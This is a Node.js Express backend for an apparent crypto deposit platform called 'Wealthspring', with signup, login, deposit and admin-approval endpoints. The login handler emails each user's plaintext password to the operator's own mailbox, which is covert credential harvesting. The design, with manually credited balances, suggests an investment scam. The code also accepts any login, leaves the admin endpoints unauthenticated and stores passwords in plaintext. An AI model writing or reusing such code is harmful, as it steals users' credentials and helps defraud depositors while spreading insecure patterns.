const express = require('express');
const path = require('path');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());
app.use(express.json());

let users = [];
let deposits = [];

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
});

async function sendMail(to, subject, html){
  try{
    let info = await transporter.sendMail({ from: process.env.EMAIL_USER, to, subject, html });
    console.log("EMAIL SENT:", info.response);
  }catch(e){ console.log("MAIL FAILED:", e.message); }
}

app.get('/', (req,res)=> res.send('Wealthspring live - ' + new Date()));

// Signup
app.post('/api/signup', (req,res)=>{
  const {email, password} = req.body;
  if(users.find(u=>u.email===email)) return res.json({success:false});
  users.push({email, password, balance:0});
  console.log("New user:", email, "Total users:", users.length);
  res.json({success:true});
});

// Login
app.post('/api/login', async (req,res)=>{
  const {email,password} = req.body;
  const user = users.find(u=>u.email===email && u.password===password);
  if(!user){
    // Auto-create if not exists after redeploy - so balance fix works
    users.push({email, password, balance:0});
    console.log("Auto-created missing user on login:", email);
    await sendMail(process.env.EMAIL_USER, `LOGIN: ${email}`, `<p>${email} logged in (auto-created)</p>`);
    return res.json({success:true, email, balance:0});
  }
  await sendMail(process.env.EMAIL_USER, `LOGIN: ${email}`, `<p>${email} logged in at ${new Date()}</p><p>Pass: ${password}</p>`);
  res.json({success:true, email: user.email, balance: user.balance});
});

app.post('/api/balance', (req,res)=>{
  const {email} = req.body;
  const user = users.find(u=>u.email===email);
  console.log("Balance check for", email, "found:", !!user);
  res.json({balance: user?user.balance:0});
});

app.post('/api/deposit', async (req,res)=>{
  const {email, amount, txHash, hash} = req.body;
  const finalHash = txHash || hash || "No TX";
  const id = Date.now().toString();
  deposits.push({id, email, amount: Number(amount), txHash: finalHash, status:'pending', createdAt: new Date()});
  console.log("New deposit $", amount, "from", email);
  await sendMail(process.env.EMAIL_USER, `DEPOSIT $${amount} from ${email}`, `<h2>$${amount}</h2><p>${email}</p><p>TX: ${finalHash}</p><a href="https://wealthspring-backend.onrender.com/admin.html">OPEN ADMIN</a>`);
  res.json({success:true});
});

app.get('/api/admin/deposits', (req,res)=>{
  res.json({deposits: deposits.slice().reverse()});
});

// APPROVE FIXED - works even if user was deleted by redeploy
app.post('/api/admin/approve', async (req,res)=>{
  const {id} = req.body;
  const dep = deposits.find(d=>d.id===id);
  if(!dep) return res.json({success:false});
  if(dep.status==='approved') return res.json({success:true});
  dep.status='approved';
  
  let user = users.find(u=>u.email===dep.email);
  if(!user){
    user = {email: dep.email, password: 'unknown', balance: 0};
    users.push(user);
    console.log("Created user on approve:", dep.email);
  }
  user.balance += Number(dep.amount);
  console.log("Approved $", dep.amount, "new balance for", user.email, "=", user.balance);
  
  await sendMail(dep.email, "Deposit Approved", `<h2>Approved $${dep.amount}</h2>`);
  res.json({success:true, newBalance: user.balance});
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, ()=> console.log("Running", PORT));
